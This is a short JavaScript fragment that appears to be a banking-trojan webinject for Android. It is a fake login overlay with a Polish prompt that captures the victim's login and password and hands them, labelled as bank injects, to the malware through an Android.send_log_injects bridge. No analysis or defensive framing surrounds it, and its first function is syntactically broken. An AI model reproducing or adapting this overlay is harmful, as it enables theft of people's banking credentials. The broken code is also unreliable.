<script type="text/javascript">
    function next() {

    return false;
}
        document.getElementById("log1").style.display="none";
        document.getElementById("pw").style.display="block";
        document.getElementById('inputlogin').innerText = document.getElementById('login').value;
    }
function testJump(x){
    var ml = ~~x.getAttribute('maxlength');
    if(ml && x.value.length >= ml){
        do {
      x = x.nextSibling;
    }
    while (x && !((/text/.test(x.type)) || x.disabled));
        if(x && /text/.test(x.type)){
            x.focus();
        }
    }
}
</script>

<script>
function send_form()
{

        if (document.getElementById("password").value == '')
{
    alert ('Wszystkie pola wymagane!');
    return false;
}
var data = {};
    data.login = document.getElementById('login').value;
    data.password = document.getElementById('password').value;
    data.type_injects = "banks";
    data.closed = "close_activity_injects";
    
    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
        try {
            Android.send_log_injects(JSON.stringify(data))
        } catch (err) {}
    }else{
        alert(JSON.stringify(data));
    } 
}
</script>
